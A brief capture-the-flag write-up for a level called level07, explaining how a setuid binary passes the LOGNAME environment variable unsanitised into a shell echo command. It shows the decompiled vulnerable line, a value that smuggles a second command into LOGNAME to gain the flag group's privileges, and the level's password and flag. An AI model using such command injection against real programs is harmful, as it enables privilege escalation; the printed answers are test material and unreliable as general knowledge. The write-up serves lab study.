# level07

## Vulnerability: Environnement variable trickery leading to code injection

level07's password: `wiok45aaoguiboiki2tuin6ub`

1. examinate existing files and permissions

```bash
ls -la
```

shows that the level07 executable belongs to flag07 group, privilege escalation should be possible

2. get the executable (from an external device), decompile it using [retdec](https://github.com/avast/retdec) and examine the resulting code

```bash
scp -P 4242 level07@<host>:level07 .
retdecomp level07
```

shows `asprintf(&buffer, "/bin/echo %s ", getenv("LOGNAME"));` which permits arbitrary code execution

4. tweak the environment variables and pwn the flag

```bash
LOGNAME='exploit;getflag'
./level07
```

gives flag: `fiumuikeil55xe9cu4dood66h`
